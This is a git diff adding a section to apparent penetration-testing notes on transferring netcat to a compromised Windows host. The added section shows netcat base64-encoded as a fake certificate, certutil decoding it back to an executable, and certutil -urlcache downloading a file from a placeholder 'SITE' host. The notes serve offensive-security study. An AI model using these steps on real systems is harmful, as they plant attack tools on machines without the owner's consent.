@@ -22,6 +22,30 @@ cat nc.cmd | xclip -selection clipboard
 
 paste it into the windows shell
 
+## Certutil
+
+Base64 encode the binary file outside
+
+```
+$raw = Get-Content -Path c:\nc.exe -Encoding Byte
+$b64 = [System.Convert]::ToBase64String($raw)
+$begin= "-----BEGIN CERTIFICATE-----"
+$end = "-----END CERTIFICATE-----"
+"$begin$b64$end" | Out-File c:\nc.txt
+```
+
+Download via Notepad; certutil to write:
+
+```
+certutil.exe -decode nc.txt nc.exe
+```
+
+we can use certutils cache feature to download the file:
+
+```
+certutil.exe –urlcache -split –f "http://SITE/nc.crt" nc.txt
+```
+
 ## debug.exe
 
 This is a crazy technique that works on windows 32 bit machines. Basically the idea is to use the debug.exe program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take a binaries, like netcat. And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with debug.exe.
